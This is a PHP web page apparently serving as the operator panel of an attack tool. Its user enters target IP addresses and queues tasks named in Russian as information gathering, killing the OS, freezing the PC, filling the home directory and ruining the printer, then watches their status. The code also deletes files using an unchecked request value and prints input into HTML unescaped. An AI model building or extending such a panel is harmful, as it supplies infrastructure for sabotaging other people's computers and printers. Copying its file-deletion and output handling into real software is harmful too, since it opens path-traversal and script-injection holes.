<?php

session_start();
include 'functions.php';
$taskList = [
    "main"    => "Сбор информации",
    "hdd"     => "Убить ОС",
    "os"      => "Зависание пк",
    "home"    => "Забить home",
    "printer" => "Испортить Принтер",
];
$dir = $_SESSION['dir'];
$user = $_SESSION['user'];
$taskDir = $dir . 'task/';

$view = 0;
if (count($_POST) > 0) {
    if (isset($_POST['view'])) {
        $task = getTasks($taskDir);
        $html = '';
        if (!empty($task)) {
            // $task = array_reverse($task);
            $html = '<table class="table">
                    <thead>
                    <tr>
                        <th>#</th>
                        <th>IP</th>
                        <th>Task</th>
                        <th>Status</th>
                        <th>Date</th>
                        <th>Actions</th>
                    </tr>
                    </thead>
                    <tbody>';
            $num = 1;

            foreach ($task as $id => $taskItem) {
                switch ($taskItem['status']) {
                    case 0:
                        $statusName = "В процессе";
                        break;
                    case 1:
                        $statusName = '<a target="_blank" href="' . rtrim(
                                $dir,
                                '\\'
                            ) . $taskItem['report'] . '">Готов</a>';
                        break;
                    case 2:
                        $statusName = "Время мониторинга истекло";
                        break;
                    case 3:
                        $statusName = "В сети! Ошибка авторизации";
                        break;
                    case 4:
                        $statusName = "Включен мониторинг на 3 дня";
                        break;
                    default:
                        $statusName = "В процессе";
                }
                $html .= '<tr>
                            <td>' . $num++ . '</td>
                            <td>' . $taskItem['ip'] . '</td>
                            <td>' . $taskList[$taskItem['name']] . '</td>
                            <td>' . $statusName . '</td>
                            <td>' . $taskItem['date'] . '</td>
                            <td><button class="btn btn-danger del-task" data-key="' . $id . '"> &times;</button></td>
                        </tr>';
            }
            $html .= '</tbody>
                </table>';
        }
        print_r($html);
        return;
    }
    if (isset($_POST['del'])) {
        $key = $_POST['key'];
        $delFile = __DIR__ . DIRECTORY_SEPARATOR . $taskDir . $key . '.task';
        @unlink($delFile);
        print_r(json_encode(['status' => 1, 'msg' => 'Deleted']));

        return;
    } else {
        $ips = trim($_POST['ip']);
        $ips = str_replace(',', '.', $ips);
        $ips = explode("|", $ips);
        $taskName = trim($_POST['task']);
        $response = ['status' => false, 'msg' => ''];

        $task = getTasks($taskDir);
        if (count($task) >= 30) {
            $response['msg'] = ('Превышен лимит заданий');
        } else {
            foreach ($ips as $ip) {
                saveTask(
                    $taskDir,
                    [
                        "name"   => $taskName,
                        "ip"     => $ip,
                        'status' => 0,
                        'date'   => date("Y-m-d"),
                    ]
                );
            }
            $response = ['status' => true, 'msg' => 'Задание добавлено'];
        }
        echo json_encode($response);
        return true;
    }
}
?>
<nav class="navbar navbar-dark bg-dark">
    <h4 class="logo">Script panel</h4>
</nav>
<div class="container">
    <!--    <div class="row">-->
    <!--        <div class="col">--><?
    //= getAlert() ?><!--</div>-->
    <!--    </div>-->
    <form method="post" class="ip-form">
        <div class="inputs">
            <div class="form-group">
                <label for="ip" class="col-sm-1-12 col-form-label" title="Используйте '|' как разделитель IP адресов">Введите
                    IP адрес</label>
                <input type="text" class="form-control" name="ip" id="ip" placeholder="__.__.__.__" required>
            </div>
            <div class="form-group">
                <label for="task">Задание</label>
                <select class="form-control" name="task" id="task">
                    <option value="">--Выберите задание--</option>
                    <?php
                    foreach ($taskList as $task => $taskName): ?>
                        <option value="<?= $task ?>"><?= $taskName ?></option>
                    <?php
                    endforeach; ?>
                </select>
            </div>
        </div>
        <div class="group">
            <div class="form-group">
                <button type="submit" class="btn btn-info apply">Добавить задание</button>
            </div>
            <div class="form-group">
                <button class="btn btn-warning show-task">Просмотреть задания</button>
            </div>
            <div class="form-group">
                <a href="/" class="btn btn-danger">Выйти</a>
            </div>
        </div>
    </form>
    <div class="row">
        <div id="table"></div>
    </div>
</div>
<script>
    function getTable() {
        $.post('task.php', {view: 1}, resp => {
            $('#table').html(resp);
        })
    }

    $(document).ready(() => {
        $(document).on('click', '.del-task', e => {
            let key = $(e.target).data('key'),
                tr = $(e.target).parents('tr');
            $.post('task.php', {del: 'del', key: key}, resp => {
                resp = JSON.parse(resp);
                if (resp.status) {
                    tr.remove();
                    alert(resp.msg);
                }
            });
        });
        $('.show-task').on('click', (e) => {
            e.preventDefault();
            getTable();
            setInterval(getTable, 2000)

        });
        $('.apply').on('click', (e) => {
            e.preventDefault();
            let ip = $('#ip'),
                task = $('#task');
            console.log({ip: ip.val(), task: task.val()});
            if (!ip.val()) {
                ip.addClass('error');
                alert('Введите IP адрес');
                return false;
            } else {
                ip.removeClass('error');
            }
            if (!task.val()) {
                task.addClass('error');
                alert('Выберите задание');
                return false;
            } else {
                task.removeClass('error');
            }
            $.post('task.php', {ip: ip.val(), task: task.val()}, resp => {
                console.log(resp);
                resp = JSON.parse(resp);
                if (resp.status) {
                    alert(resp.msg);
                    $('form')[0].reset();
                }
            });
        })
    })
</script>

